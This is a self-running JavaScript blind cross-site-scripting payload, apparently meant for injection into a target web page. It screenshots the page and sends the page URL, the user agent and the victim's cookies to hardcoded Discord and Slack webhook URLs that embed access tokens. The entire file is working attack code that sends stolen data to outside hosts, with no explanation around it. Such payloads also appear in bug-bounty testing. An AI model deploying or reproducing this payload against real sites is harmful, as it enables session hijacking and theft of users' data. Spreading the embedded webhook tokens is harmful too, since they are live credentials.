(function() {
    // --- CONFIGURATION ---
    // PASTE YOUR DISCORD WEBHOOK URL HERE
    const discordWebhookUrl = 'https://discord.com/api/webhooks/1411319017452339301/0kk_SFr88XR9mm8v22bjgcDwdCmPeWXqAE4zSnmtrEI8DKf6DFSMJ6srVpn9_aErB37o';
    
    // PASTE YOUR SLACK WEBHOOK URL HERE
    const slackWebhookUrl = 'https://hooks.slack.com/services/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';

    // --- MAIN FUNCTION ---
    function run() {
        // Load the html2canvas library to take screenshots
        const script = document.createElement('script');
        script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
        script.crossOrigin = 'anonymous'; // Recommended for cross-origin resources
        document.head.appendChild(script);

        script.onload = () => {
            // Once the library is loaded, capture the screen
            html2canvas(document.body, { useCORS: true }).then(canvas => {
                const screenshotBlob = canvasToBlob(canvas);
                
                // Send notifications to both services
                sendToDiscord(screenshotBlob);
                sendToSlack(screenshotBlob);
            });
        };
        script.onerror = () => {
            // Fallback if html2canvas fails: send a report without a screenshot
            sendToDiscord(null);
            sendToSlack(null);
        };
    }

    // --- SENDER FUNCTIONS ---
    function sendToDiscord(blob) {
        if (!discordWebhookUrl.startsWith('https://discord.com')) return;

        const formData = new FormData();
        const embed = {
            title: "Blind XSS Fired!",
            description: `**Vulnerable URL:**\n\`\`\`${document.location.href}\`\`\``,
            color: 5814783, // Blue
            fields: [
                { name: "User Agent", value: navigator.userAgent },
                { name: "Cookies", value: `\`\`\`${document.cookie || 'Not Accessible'}\`\`\`` }
            ],
        };

        if (blob) {
            embed.image = { url: "attachment://screenshot.jpg" };
            formData.append('file', blob, 'screenshot.jpg');
        }

        formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
        
        fetch(discordWebhookUrl, { method: 'POST', body: formData });
    }

    function sendToSlack(blob) {
        if (!slackWebhookUrl.startsWith('https://hooks.slack.com')) return;

        const textPayload = `*Blind XSS Fired!* :alert:\n\n*Vulnerable URL:*\n\`${document.location.href}\`\n\n*User Agent:*\n\`${navigator.userAgent}\`\n\n*Cookies:*\n\`${document.cookie || 'Not Accessible'}\``;
        
        if (blob) {
            // For Slack, we need to first upload the file, then send a message linking to it.
            // This is a more complex flow, so for simplicity in a single payload,
            // we will send the text and then note that a screenshot was taken.
            // A true file upload requires API tokens, not just a webhook.
            // This simplified version sends the text and confirms a screenshot was generated.
            const formData = new FormData();
            formData.append('payload', JSON.stringify({ text: textPayload + "\n\n(Screenshot captured but not attached due to Slack API limitations in this context.)" }));
            fetch(slackWebhookUrl, { method: 'POST', body: formData });
        } else {
             const formData = new FormData();
             formData.append('payload', JSON.stringify({ text: textPayload }));
             fetch(slackWebhookUrl, { method: 'POST', body: formData });
        }
    }

    // --- HELPER FUNCTION ---
    function canvasToBlob(canvas) {
        const dataURL = canvas.toDataURL('image/jpeg', 0.7);
        const arr = dataURL.split(',');
        const mime = arr[0].match(/:(.*?);/)[1];
        const bstr = atob(arr[1]);
        let n = bstr.length;
        const u8arr = new Uint8Array(n);
        while (n--) {
            u8arr[n] = bstr.charCodeAt(n);
        }
        return new Blob([u8arr], { type: mime });
    }

    // --- EXECUTE ---
    run();
})();
